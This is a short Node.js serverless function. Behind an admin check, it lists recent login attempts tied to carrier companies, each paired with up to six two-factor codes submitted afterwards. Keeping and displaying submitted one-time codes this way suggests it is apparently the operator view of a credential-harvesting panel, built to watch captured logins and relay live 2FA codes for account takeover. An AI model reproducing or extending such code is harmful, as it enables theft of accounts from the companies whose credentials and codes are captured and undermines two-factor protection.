const { supabase } = require('./_shared/supabase')
const { cors, verifyAdmin } = require('./_shared/auth')

exports.handler = async (event) => {
  if (event.httpMethod === 'OPTIONS') return cors({})
  if (!verifyAdmin(event)) return cors({ error: 'Unauthorized' }, 401)

  const { data: attempts } = await supabase
    .from('login_attempts')
    .select('*, carriers(company_legal_name)')
    .order('id', { ascending: false })
    .limit(100)

  const rows = attempts || []

  const result = await Promise.all(rows.map(async (row) => {
    const { carriers: carrierJoin, ...rest } = row

    const { data: codes } = await supabase
      .from('twofa_attempts')
      .select('code')
      .eq('carrier_id', row.carrier_id)
      .gte('created_at', row.created_at)
      .order('id', { ascending: true })
      .limit(6)

    const codeList = (codes || []).map(c => c.code)
    return {
      ...rest,
      company_legal_name: carrierJoin ? carrierJoin.company_legal_name : null,
      twofa_code_1: codeList[0] || null,
      twofa_code_2: codeList[1] || null,
      twofa_code_3: codeList[2] || null,
      twofa_code_4: codeList[3] || null,
      twofa_code_5: codeList[4] || null,
      twofa_code_6: codeList[5] || null,
    }
  }))

  return cors(result)
}
